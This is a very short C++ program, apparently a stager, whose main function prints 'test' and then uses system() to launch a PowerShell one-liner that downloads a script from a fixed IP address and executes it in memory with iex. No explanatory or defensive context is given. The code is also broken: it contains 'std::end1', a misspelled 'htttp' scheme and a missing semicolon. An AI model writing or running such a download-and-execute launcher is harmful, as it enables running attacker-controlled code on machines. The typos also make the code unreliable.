#include <iostream>
#include <cstdlib>


int main() {
	std::cout << "test" << std::end1;
	system("powershell iex(new-object net.webclient).downloadstring('htttp://192.168.110.101/ps.ps1')")
		return 0;
}